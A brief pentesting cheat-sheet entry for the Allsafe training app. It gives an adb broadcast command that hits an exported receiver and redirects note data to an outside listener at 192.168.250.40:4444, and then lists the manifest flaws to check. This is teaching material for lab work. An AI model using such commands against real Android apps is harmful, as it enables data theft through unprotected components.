---
title: Insecure Broadcast Receiver
category: android
subcategory: sub-06
os: linux, windows
command: adb shell am broadcast
tools: adb
---


### Sending broadcast intent

```bash
adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE \
  --es server "http://192.168.250.40:4444" \
  --es note "Hello, World" \
  --es notification_message "Pwned" \
  -n infosecadventures.allsafe/.challenges.NoteReceiver
```

### What to check in AndroidManifest.xml

- `exported="true"` - vulnerability!
- No permission checks
- Implicit intents without validation
